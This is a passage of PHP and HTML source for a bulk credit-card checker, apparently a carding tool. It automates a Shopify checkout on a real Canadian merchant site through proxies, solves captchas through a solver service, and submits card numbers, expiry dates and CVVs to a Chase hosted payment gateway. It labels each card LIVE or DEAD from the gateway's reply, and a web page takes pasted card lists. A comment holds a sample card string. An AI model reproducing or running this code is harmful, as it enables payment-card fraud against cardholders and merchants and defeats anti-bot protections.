$DATA = '{"variables":{"sessionInput":{"sessionToken":"'.$SESSION.'"},"queueToken":"'.$QUEUE_TOKEN.'","discounts":{"lines":[],"acceptUnexpectedDiscounts":true},"delivery":{"deliveryLines":[{"destination":{"partialStreetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"'.$phone.'","oneTimeUse":false}},"selectedDeliveryStrategy":{"deliveryStrategyByHandle":{"handle":"'.$HANDLE.'","customDeliveryRate":false},"options":{}},"targetMerchandiseLines":{"lines":[{"stableId":"'.$STAPLE_ID.'"}]},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"value":{"amount":"10.00","currencyCode":"CAD"}},"destinationChanged":false}],"noDeliveryRequired":[],"useProgressiveRates":false,"prefetchShippingRatesStrategy":null,"supportsSplitShipping":true},"deliveryExpectations":{"deliveryExpectationLines":[{"signedHandle":"'.$SIGNED_HANDLE.'"}]},"merchandise":{"merchandiseLines":[{"stableId":"'.$STAPLE_ID.'","merchandise":{"productVariantReference":{"id":"gid://shopify/ProductVariantMerchandise/'.$VARIANT.'","variantId":"gid://shopify/ProductVariant/'.$VARIANT.'","properties":[],"sellingPlanId":null,"sellingPlanDigest":null}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"value":{"amount":"'.$AMOUNT.'","currencyCode":"CAD"}},"lineComponentsSource":null,"lineComponents":[]}]},"memberships":{"memberships":[]},"payment":{"totalAmount":{"any":true},"paymentLines":[{"paymentMethod":{"directPaymentMethod":null,"giftCardPaymentMethod":null,"redeemablePaymentMethod":null,"walletPaymentMethod":null,"walletsPlatformPaymentMethod":null,"localPaymentMethod":null,"paymentOnDeliveryMethod":null,"paymentOnDeliveryMethod2":null,"manualPaymentMethod":null,"customPaymentMethod":null,"offsitePaymentMethod":{"name":"Payment Method","paymentMethodIdentifier":"'.$PAYMENT_IDENTIFIER.'","billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"'.$phone.'"}}},"customOnsitePaymentMethod":null,"deferredPaymentMethod":null,"customerCreditCardPaymentMethod":null,"paypalBillingAgreementPaymentMethod":null,"remotePaymentInstrument":null},"amount":{"any":true}}],"billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"'.$phone.'"}}},"buyerIdentity":{"customer":{"presentmentCurrency":"CAD","countryCode":"CA"},"email":"'.$email.'","emailChanged":false,"phoneCountryCode":"CA","marketingConsent":[{"email":{"value":"'.$email.'"}}],"shopPayOptInPhone":{"number":"'.$phone.'","countryCode":"CA"},"rememberMe":false},"tip":{"tipLines":[]},"taxes":{"proposedAllocations":null,"proposedTotalAmount":{"value":{"amount":"'.$AMT3.'","currencyCode":"CAD"}},"proposedTotalIncludedAmount":null,"proposedMixedStateTotalAmount":null,"proposedExemptions":[]},"note":{"message":null,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":null,"scriptFingerprint":{"signature":null,"signatureUuid":null,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":false},"cartMetafields":[],"includeTaxStrategyLines":false},"operationName":"Proposal","id":"'.$ID.'"}';

$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$SIGNED_HANDLE = CurlX::ParseString($curl, '"signedHandle":"','"');
$AMT4 = CurlX::ParseString($curl, '"runningTotal":{"value":{"amount":"','"');
$AMT5 = CurlX::ParseString($curl, '"totalTaxAndDutyAmount":{"value":{"amount":"','"');
Logger::pretier("SIGNED_HANDLE: {$SIGNED_HANDLE}\nAmt: $AMT4\nAmt: $AMT5", 'CArt Dates');
    #------------------------[Curl-10]------------------------#

function randomizeString($input) {
    // Convert string to array
    $chars = str_split($input);
    
    // Shuffle characters
    shuffle($chars);
    
    // Convert back to string
    return implode('', $chars);
}

// Example usage
$original = "e39k2jci6c";
$randomized = randomizeString($original);


$URL = 'https://tacticalproductscanada.com/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: application/json',
'Accept-Language: en-CA',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'',
'content-type: application/json',
'shopify-checkout-client: checkout-web/1.0',
'shopify-checkout-source: id="'.$KEYY.'", type="cn"',
'x-checkout-one-session-token: '.$SESSION.'',
'x-checkout-web-build-id: '.$BUILD_ID.'',
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: yes',
'x-checkout-web-source-id: '.$KEYY.'',
'Origin: https://tacticalproductscanada.com',
];

$DATA = '{"variables":{"input":{"sessionInput":{"sessionToken":"'.$SESSION.'"},"queueToken":"'.$QUEUE_TOKEN.'","discounts":{"lines":[],"acceptUnexpectedDiscounts":true},"delivery":{"deliveryLines":[{"destination":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"'.$phone.'","oneTimeUse":false}},"selectedDeliveryStrategy":{"deliveryStrategyByHandle":{"handle":"'.$HANDLE.'","customDeliveryRate":false},"options":{}},"targetMerchandiseLines":{"lines":[{"stableId":"'.$STAPLE_ID.'"}]},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"value":{"amount":"10.00","currencyCode":"CAD"}},"destinationChanged":false}],"noDeliveryRequired":[],"useProgressiveRates":false,"prefetchShippingRatesStrategy":null,"supportsSplitShipping":true},"deliveryExpectations":{"deliveryExpectationLines":[{"signedHandle":"'.$SIGNED_HANDLE.'"}]},"merchandise":{"merchandiseLines":[{"stableId":"'.$STAPLE_ID.'","merchandise":{"productVariantReference":{"id":"gid://shopify/ProductVariantMerchandise/'.$VARIANT.'","variantId":"gid://shopify/ProductVariant/'.$VARIANT.'","properties":[],"sellingPlanId":null,"sellingPlanDigest":null}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"value":{"amount":"'.$AMOUNT.'","currencyCode":"CAD"}},"lineComponentsSource":null,"lineComponents":[]}]},"memberships":{"memberships":[]},"payment":{"totalAmount":{"any":true},"paymentLines":[{"paymentMethod":{"directPaymentMethod":null,"giftCardPaymentMethod":null,"redeemablePaymentMethod":null,"walletPaymentMethod":null,"walletsPlatformPaymentMethod":null,"localPaymentMethod":null,"paymentOnDeliveryMethod":null,"paymentOnDeliveryMethod2":null,"manualPaymentMethod":null,"customPaymentMethod":null,"offsitePaymentMethod":{"name":"Payment Method","paymentMethodIdentifier":"'.$PAYMENT_IDENTIFIER.'","billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"'.$phone.'"}}},"customOnsitePaymentMethod":null,"deferredPaymentMethod":null,"customerCreditCardPaymentMethod":null,"paypalBillingAgreementPaymentMethod":null,"remotePaymentInstrument":null},"amount":{"value":{"amount":"'.$AMT4.'","currencyCode":"CAD"}}}],"billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"'.$phone.'"}}},"buyerIdentity":{"customer":{"presentmentCurrency":"CAD","countryCode":"CA"},"email":"'.$email.'","emailChanged":false,"phoneCountryCode":"CA","marketingConsent":[{"email":{"value":"'.$email.'"}}],"shopPayOptInPhone":{"number":"'.$phone.'","countryCode":"CA"},"rememberMe":false},"tip":{"tipLines":[]},"taxes":{"proposedAllocations":null,"proposedTotalAmount":{"value":{"amount":"'.$AMT5.'","currencyCode":"CAD"}},"proposedTotalIncludedAmount":null,"proposedMixedStateTotalAmount":null,"proposedExemptions":[]},"note":{"message":null,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":null,"scriptFingerprint":{"signature":null,"signatureUuid":null,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":false},"cartMetafields":[]},"attemptToken":"'.$KEYY.'-82wm0pucud9","metafields":[],"analytics":{"requestUrl":"https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'","pageId":"'.GUID().'"},"includeTaxStrategyLines":false},"operationName":"SubmitForCompletion","id":"'.$IDs.'"}';
 $curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$RECEIPT = CurlX::ParseString($curl, '"receipt":{"id":"gid://shopify/ProcessedReceipt/','"');
$SESSION = CurlX::ParseString($curl, '"sessionToken":"','"');
Logger::pretier("RECEIPT: {$RECEIPT}", 'Payment Dates');

if(!$curl == ',"__typename":"SubmitSuccess"'){
  echo "Issues on Last shopify";
  die();
}

#AAEBeCaaBgpbgGKQzbVip8-YhoKolRwhfyvRMz2IfTfFizp7LElzxdWiIDBJiDN9OQVjIltHNJkQ644ji9dkYecA1Zrqc9zIhamK534y1mpUnlC6z0ZzSc_wqO6yBRYuiL6rAnZxBijDqeyYNkOAogoi_X7TnmqVSZcsgWg6xFK5eokclsObjyEbszy22beyJ3wKmDclnzxsJ5S7PgYfjlWf-V76pSYXUZLU_sGUdTo
    #------------------------[Curl-11]------------------------#

    $URL = 'https://tacticalproductscanada.com/checkouts/internal/graphql/persisted?operationName=PollForReceipt&variables=%7B%22receiptId%22%3A%22gid%3A%2F%2Fshopify%2FProcessedReceipt%2F'.$RECEIPT.'%22%2C%22sessionToken%22%3A%22'.$SESSION.'%22%7D&id='.$IDq.'';

$HEADERS = [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
    'Accept: application/json',
    'Accept-Language: en-CA',
    'Referer: https://tacticalproductscanada.com/checkouts/cn/hWNAjwzQjLpESEXhXETsbXnA/en-ca?_r=AQABaXJXLeu_xxXkp9pNsfp7CJsS291V8dO6m2o7GUHa',
    'content-type: application/json',
    'shopify-checkout-client: checkout-web/1.0',
    'shopify-checkout-source: id=',
'x-checkout-one-session-token: '.$SESSION.'',
'x-checkout-web-build-id: '.$BUILD_ID.'',
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: yes',
'x-checkout-web-source-id: '.$KEYY.'',
    ];
echo $curl = CurlX::Get($URL, $HEADERS, null, $PROXY)->body;
$P_URL = CurlX::ParseString($curl, '"url":"https://jpmc.chasepaymentechhostedpay.com/','"'); #payments/jpmc_temp.php?sid=rgI0jEMpm5vHiP0e1H9SLDZkd
$SID = CurlX::ParseString($curl, '/jpmc_temp.php?sid=','"');
if(empty($SID)){
  die();}
Logger::pretier("Payment URL: {$P_URL}\n sid: {$SID}", 'Payment Datas');

    #------------------------[Curl-12]------------------------#

$URL = 'https://jpmc.chasepaymentechhostedpay.com/'.$P_URL.'';

$HEADERS = [
'Host: jpmc.chasepaymentechhostedpay.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://tacticalproductscanada.com/',
];
$curl = CurlX::Get($URL, $HEADERS, $COOKIE, $PROXY)->body;
    $AUTH_TOKEN = CurlX::ParseString($curl, "auth_token: '","'");
Logger::pretier("AUTH_TOKEN: {$AUTH_TOKEN}", 'Payment Datas');

    #------------------------[Curl-13]------------------------#

$URL = 'https://jpmc.chasepaymentechhostedpay.com/payments/processUID.php';

$HEADERS = [
'Host: jpmc.chasepaymentechhostedpay.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: */*',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://jpmc.chasepaymentechhostedpay.com/'.$P_URL.'',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://jpmc.chasepaymentechhostedpay.com',
];

$DATA = 'order_id='.$SID.'&formName=long_cc_form1&auth_token='.$AUTH_TOKEN.'';
$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$UID = CurlX::ParseString($curl, '"uid":"','"');
Logger::pretier("UID: {$UID}", 'Payment Datas');

    #------------------------[Curl-14]------------------------#

$URL = 'https://chase.hostedpaymentservice.net/hpf/?uid='.$UID.'';

$HEADERS = [
'Host: chase.hostedpaymentservice.net',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://jpmc.chasepaymentechhostedpay.com/',
];
$curl = CurlX::Get($URL, $HEADERS, $COOKIE, $PROXY)->body;
$SIDs = CurlX::ParseString($curl, 'input type="hidden" id="sid" name="sid" value="','"');
Logger::pretier("SIDs: {$SIDs}", 'Payment Datas');
if(empty($SID)){
  die();
}
    #------------------------[Curl-15]------------------------#
$re_code = SolveRecaptcha('MTPublic-I0V7iwug2', 'https://jpmc.chasepaymentechhostedpay.com/', [
 # "proxy" => ProxysConfig::GetProxyFormat(ProxyHelper::getProxy('GATEWAY')),
  'userAgent' => $ua,
], 'mtcaptchaproxyless');
Logger::pretier("Recaptcha: {$re_code}", 'Recap');
$URL = 'https://chase.hostedpaymentservice.net/api/process';

$HEADERS = [
'Host: chase.hostedpaymentservice.net',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: application/json',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://chase.hostedpaymentservice.net/hpf/?uid='.$UID.'',
'Content-type: application/json',
'Origin: https://chase.hostedpaymentservice.net',
];

$DATA = '{"sid":"'.$SIDs.'","billing_name":"'.$name.' '.$last.'","address":"'.$c4.' Nootka Street","address2":"","state_province":"ON","country":"CAN","postal_code":"V5M 3M5","email":"'.$email.'","phone":"'.$phone.'","pan":"'.$cc.'","exp_month":"'.$mes.'","exp_year":"'.$ano.'","cvv":"'.$cvv.'","mtcaptcha-verifiedtoken":"'.$re_code.'","merchant_callbacks":"startPayment,cancelPayment,completePayment,handleTransactionErrors,hpfReady"}';
$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$MSG = CurlX::ParseString($curl, '"gateway_message":"','"');



    
    CurlX::DeleteCookie();
    if (strpos($curl, '"statuscode":"success"')) {
      GetResponse('LIVE', "Charged 45$");
    } elseif (strpos($curl, 'The security code you entered does not match. Please update the CVV and try again.')) {
      GetResponse('LIVE', $MSG);
    } elseif (!$curl) {
    } else {
      GetResponse('DEAD', $MSG);
    }
  } catch (Throwable $th) {
    GetResponse('DEAD', $th->getMessage());
  }
}


#php .\debug.php "4974014843477519|05|2023|261"
#Location: https://sirdar.com/en/orders/R648938174/token/fsN6nJd6-L9-LmhPegKifQ

?>
<html>

<head>
  <title><?php echo $Gateway; ?></title>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: black;
      width: 100%;
      height: 100vh;
      text-align: center;
      margin: 0;
    }

    ::-webkit-scrollbar {
      width: 5px;
    }

    ::-webkit-scrollbar-track {
      background: none
    }

    ::-webkit-scrollbar-thumb {
      background: #888;
      border-radius: 8px;
    }

    ::-webkit-scrollbar-thumb:hover {
      background: #555;
    }

    body,
    th,
    td,
    span,
    button,
    input,
    textarea,
    option,
    select {
      color: white;
      font-family: 'Roboto Mono', monospace;
    }

    .top-c,
    .bottom-c {
      min-height: 100%;
      width: 100%;
    }

    .content {
      min-height: 100%;
      width: 70%;
      margin: 0 auto;
    }

    #cards {
      width: 100%;
      height: 120px;
      background-color: black;
      border: 1px solid;
      border-radius: 8px;
      color: white;
      text-align: center;
      margin-top: 10px;
      padding-top: 20px;
      font-size: 10px;
    }

    #title {
      margin-top: 20px;
      font-size: 40px;
    }

    .statuses {
      width: 100%;
      min-height: 120px;
      display: flex;
      margin-top: 20px;
    }

    .statuses>div {
      width: 100%;
      max-width: 100%;
      background-color: black;
      border: 1px solid;
      border-radius: 8px;
    }

    .left {
      margin-left: 10px;
    }

    .right {
      margin-right: 10px;
    }

    .buttons {
      display: flex;
      width: 100%;
      height: 50px;
      margin-top: 20px;
      margin-bottom: 40px;
    }

    .buttons>button {
      background-color: black;
      font-size: 20px;
      border-color: white;
    }

    .start {
      width: 100%;
      border: none;
      border: 1px solid;
      border-right: none;
      color: #12a339;
    }

    .stop {
      width: 100%;
      border: none;
      border: 1px solid;
      border-left: none;
      color: #bd2626;
    }

    .g {
      color: #12a339;
    }

    .b {
      color: #bd2626;
    }

    .but {
      text-align: left;
      ;
      padding-left: 25px;

    }

    .gates {
      width: 90%;
      margin: 0 auto;
      margin-top: 10px;
      background-color: black;
      border: none;
      border: 1px solid;
      color: white;
      height: 25%;
      border-radius: 8px;
    }

    .buttons>button:hover,
    .buttons>button:active {
      background-color: white;
      transition-duration: 0.5s;
    }

    .results {
      width: 100%;
      max-height: 400px;
      margin-top: 20px;
      overflow: scroll;
    }

    select {
      padding-left: 15px;
    }

    .y {
      color: #d1c92a;
    }

    .lives {
      width: 100%;
      min-height: 50px;
      text-align: center;
    }

    .result {
      display: flex;
      height: 20px;
      width: 100%;
      margin: 0 auto;
      border-bottom: 1px solid #383838;
      margin-top: 10px;
      padding-bottom: 10px;
      text-align: left;
    }

    .result>div {
      width: 100%;
      text-align: center;
      margin-left: 10px;
      white-space: nowrap;
    }

    .results>h1 {
      position: sticky;
    }

    .result>.g,
    .result>.b {
      width: 30%;
    }

    .content>h1 {
      border-radius: 8px;
      border: 1px solid;
    }

    .b-s {
      width: 30%;
      width: 70px;
    }

    .card-r {
      color: white;
      text-align: left;
      width: 70px;
    }
  </style>
</head>

<body>
  <div class="top-c">
    <h1 id="title"><?php echo $Gateway; ?></h1>
    <div class="content">
      Cards
      <textarea id="cards" placeholder="xxxxxxxxxxxxxxxx|xx|xxxx|xxx"></textarea>
      <div class="statuses">
        <div class="right but">
          <p class="g">Live : <span id="count-live">0</span></p>
          <p class="b">Dead : <span id="count-dead">0</span></p>
          <p class="y">Total: <span id="count-all">0</span> / <span id="count-every">0</span></p>
        </div>
        <div class="left">
          <p><?php echo $Gateway; ?> - FAITH INDEX</p>
          <p><a href="https://t.me/Tfp0days">@Tfp0days</i></a></p>
          Time: <span class="badge badge-white" id="Date___">NULL</span>

        </div>
      </div>
      <div class="buttons">
        <button onclick="start()" class="start">Start</button>
        <button onclick="stop()" class="stop">Stop</button>
      </div>
      <h1 class="g">LIVE</h1>
      <div class="results" id="live-container">
      </div>
      <h1 class="b">DEAD</h1>
      <div class="results" id="dead-container">
      </div>
    </div>
  </div>
  <script title="Faith Checker">
    function update() {
      window.gate = $('#c-gate').children('option:selected').val();
      var cards = window.cards = ($('#cards').val()).split("\n");
      window.countcards = cards.length;
      $('#count-every').html(window.countcards);
    }

    function stop() {
      window.stopCheck = true;
    }
    async function start() {
      update();
      window.stopCheck = false;
      for (const card of window.cards) {
        if (window.stopCheck) {
          continue;
        }
        await new Promise(function (r, rej) {
          $.get(
            '?card=' + card,
            function (data, shit) {
              if (data.match('LIVE')) {
                ACounter('live');
                $('#live-container').prepend(data);
              } else {
                ACounter('dead');
                $('#dead-container').prepend(data);
              }
              reml();
              r();
            }
          );
        });
      }
    }

    function ACounter(sect) {
      var c = $('#count-' + sect);
      c.html(parseInt(c.html()) + 1);
      var d = $('#count-all');
      d.html(parseInt(d.html()) + 1);
    }

    function reml() {
      var cards = $('#cards').val().split('\n');
      cards.splice(0, 1);
      $("#cards").val(cards.join("\n"));
    }
  </script>
</body>
<script>
  var myVar = setInterval(function () {
    Hora()
  }, 1000);

  function Hora() {
    var d = new Date();
    document.getElementById("Date___").innerHTML = d.toLocaleTimeString();
  }
</script>

</html>